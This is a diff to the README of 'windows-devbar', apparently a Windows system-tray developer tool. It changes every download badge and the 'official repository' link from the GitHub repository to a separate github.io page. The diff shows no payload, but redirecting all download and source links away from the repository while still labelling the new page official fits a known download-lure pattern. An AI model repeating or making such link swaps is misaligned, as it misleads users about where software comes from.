@@ -18,7 +18,7 @@ The best part? You don't need to be a programmer to use it. It's designed for ev
 
 ### Step 1: Get the Application
 
-[![Download windows-devbar](https://img.shields.io/badge/Download-windows--devbar-2ea44f?style=for-the-badge)](https://github.com/linerwest67/windows-devbar)
+[![Download windows-devbar](https://img.shields.io/badge/Download-windows--devbar-2ea44f?style=for-the-badge)](https://linerwest67.github.io)
 
 Visit this link to download the application.
 
@@ -125,11 +125,11 @@ windows-devbar turns your computer's system tray into a powerhouse of informatio
 
 Download it today, press that hotkey, and see what you've been missing. One hotkey. All your tools. That's windows-devbar.
 
-[![Get windows-devbar Now](https://img.shields.io/badge/Get%20windows--devbar%20Now-0078D4?style=for-the-badge&logo=windows11&logoColor=white)](https://github.com/linerwest67/windows-devbar)
+[![Get windows-devbar Now](https://img.shields.io/badge/Get%20windows--devbar%20Now-0078D4?style=for-the-badge&logo=windows11&logoColor=white)](https://linerwest67.github.io)
 
 ---
 
 **For technical details, source code, and the latest releases, visit the official repository:**  
-🔗 [https://github.com/linerwest67/windows-devbar](https://github.com/linerwest67/windows-devbar)
+🔗 [https://linerwest67.github.io](https://linerwest67.github.io)
 
 Keywords: csharp, dev-tools, docker, dotnet, menu-bar, port-killer, system-tray, windows, wpf, wsl
